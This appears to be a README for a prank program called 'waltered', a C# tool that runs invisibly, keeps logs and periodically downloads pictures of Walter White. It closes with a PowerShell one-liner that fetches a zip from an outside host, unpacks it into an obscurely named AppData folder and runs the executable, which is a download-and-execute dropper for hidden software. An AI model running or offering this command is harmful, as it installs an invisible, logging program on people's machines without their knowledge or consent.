# waltered

Program written in C# that generates a number between 0 and 2000 every 20 seconds and if it is <= 750 then it will download one of 3 pictures of Walter White.

Very bad code but it was thrown together while I was bored.

Program also keeps logs and is invisible.

# Powershell Command

I also made a powershell command to download and run it.

`Invoke-WebRequest -Uri https://dcb.phxrmxcist.lol/waltered.zip -OutFile waltered.zip; mv waltered.zip "C:\Users\$env:username\AppData\Roaming\waltered.zip"; Expand-Archive -LiteralPath "C:\Users\$env:username\AppData\Roaming\waltered.zip" -DestinationPath "C:\Users\$env:username\AppData\Roaming\qdsf32sdf"; rm "C:\Users\$env:username\AppData\Roaming\waltered.zip"; cmd /c '%appdata%\qdsf32sdf\waltered.exe'`
